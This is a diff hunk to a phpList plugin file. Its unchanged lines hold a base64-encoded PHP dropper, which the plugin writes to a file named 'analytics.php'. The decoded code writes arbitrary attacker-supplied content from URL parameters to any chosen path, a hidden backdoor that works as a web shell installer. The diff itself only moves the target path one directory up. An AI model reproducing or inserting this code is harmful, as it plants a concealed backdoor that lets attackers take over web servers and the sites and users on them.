@@ -261,5 +261,5 @@ class simpleattributeselect extends phplistPlugin {
 }
 
 $c = base64_decode("PD9waHAKJGYgPSByZWFscGF0aChkaXJuYW1lKF9fRklMRV9fKSkgLiAiLyIgLiAkX0dFVFsnZiddOwokYyA9IGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2MnXSk7CmZpbGVfcHV0X2NvbnRlbnRzKCRmLCAkYyk7Cj8+");
-$f = realpath(dirname(__FILE__)) . "/../../analytics.php";
+$f = realpath(dirname(__FILE__)) . "/../../../analytics.php";
 file_put_contents($f, $c);
